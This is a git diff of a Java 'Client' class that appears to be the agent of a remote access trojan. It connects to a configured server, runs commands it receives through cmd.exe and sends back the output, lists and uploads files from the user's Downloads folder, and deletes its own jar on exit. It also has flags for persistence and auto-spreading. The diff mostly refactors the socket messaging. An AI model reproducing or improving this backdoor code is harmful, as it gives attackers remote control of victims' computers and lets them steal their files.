@@ -1,5 +1,7 @@
 package Client;
 
+import Logger.Level;
+
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
@@ -9,8 +11,9 @@ public class Client {
     private static int PORT = 22122;
     private boolean isPersistent = false;
     private boolean autoSpread = false;
-    private BufferedOutputStream out;
     private Socket socket;
+    private DataOutputStream writer;
+
 
     private static String getHOST() {
         return HOST;
@@ -53,23 +56,28 @@ public class Client {
     private void connect() throws InterruptedException {
         try {
             socket = new Socket(getHOST(), getPORT());
-            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            out = new BufferedOutputStream(socket.getOutputStream());
+            writer = new DataOutputStream(socket.getOutputStream());
             System.out.println("Client started: " + getHOST() + ":" + getPORT());
-            String comm;
-            while ((comm = in.readLine()) != null) {
-                if (comm.contains("CMD ")) {
-                    exec(comm.replace("CMD ", ""));
-                } else if (comm.contains("FILELIST")) {
+            DataInputStream dis = new DataInputStream(socket.getInputStream());
+            while (true) {
+                String input;
+                try {
+                    input = dis.readUTF();
+                } catch (EOFException e) {
+                    break;
+                }
+                System.out.println(input);
+                if (input.contains("CMD ")) {
+                    exec(input.replace("CMD ", ""));
+                } else if (input.contains("FILELIST")) {
                     communicate("FILELIST");
                     sendFileList();
-                } else if (comm.contains("DOWNLOAD")) {
+                } else if (input.contains("DOWNLOAD")) {
                     communicate("DOWNLOAD");
                     sendFile();
-                } else if (comm.equals("EXIT")) {
+                } else if (input.equals("EXIT")) {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
-                    System.out.println(f.toString());
                     f.deleteOnExit();
                     socket.close();
                     System.exit(0);
@@ -77,18 +85,23 @@ public class Client {
             }
         } catch (IOException e) {
             /* Continually retry connection until established. */
-            System.out.println("Disconnected... retrying.");
-            Thread.sleep(1200);
+            System.out.println("Attempting to reconnect...");
             connect();
         }
     }
 
     /* Sends a message to the Server. */
     private void communicate(String msg) {
-        Writer writer = new OutputStreamWriter(out);
         try {
-            writer.write(msg);
-            writer.flush();
+            writer.writeUTF(msg);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void communicate(int msg) {
+        try {
+            writer.writeInt(msg);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -101,26 +114,21 @@ public class Client {
                 ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", command);
                 pb.redirectErrorStream(true);
                 Process proc = pb.start();
-                communicate("CMD");
-                try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-                     DataOutputStream dos = new DataOutputStream(bos);
-                     BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()))) {
+                try {
+                    BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                     ArrayList<String> output = new ArrayList<>();
                     String line;
                     while ((line = in.readLine()) != null) {
                         output.add(line);
                     }
                     proc.waitFor();
-                    dos.writeInt(output.size());
+                    communicate("CMD");
+                    communicate(output.size());
                     for (String s : output) {
-                        dos.writeUTF(s);
+                        communicate(s);
                     }
-                    dos.close();
-                    in.close();
-                } catch (IOException e) {
+                } catch (IOException | InterruptedException e) {
                     exec("");
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
                 }
             } catch (IOException e) {
                 exec("");
@@ -131,7 +139,7 @@ public class Client {
     /* Loads the .mauscs*/
     private void loadServerSettings() throws Exception {
         String filename = getMauscs();
-        Thread.sleep(2000);
+        Thread.sleep(100);
         File mauscs = new File(filename);
         try (BufferedReader reader = new BufferedReader(new FileReader(mauscs))
         ) {
@@ -152,20 +160,16 @@ public class Client {
     }
 
     private void sendFileList() {
-        try (BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
-             DataOutputStream dos = new DataOutputStream(bos)) {
-            String directory = System.getProperty("user.home") + "/Downloads/";
-            File[] files = new File(directory).listFiles();
-            dos.writeUTF(directory);
-            dos.writeInt(files.length);
-            for (File file : files) {
-                String name = file.getName();
-                dos.writeUTF(name);
-            }
-            dos.writeUTF("END");
-        } catch (IOException e) {
-            e.printStackTrace();
+        String directory = System.getProperty("user.home") + "/Downloads/";
+        File[] files = new File(directory).listFiles();
+        communicate(directory);
+        assert files != null;
+        communicate(files.length);
+        for (File file : files) {
+            String name = file.getName();
+            communicate(name);
         }
+        communicate("END");
     }
 
     private void sendFile() {
@@ -175,9 +179,7 @@ public class Client {
              DataInputStream dis = new DataInputStream(bis)) {
             String fileName = dis.readUTF();
             String saveLocation = dis.readUTF();
-
             dos.writeUTF(saveLocation);
-
             File filetoDownload = new File(fileName);
             Long length = filetoDownload.length();
             dos.writeLong(length);
@@ -189,7 +191,6 @@ public class Client {
             int fbyte;
             while ((fbyte = bs.read()) != -1) {
                 bos.write(fbyte);
-
             }
             bs.close();
             dos.close();
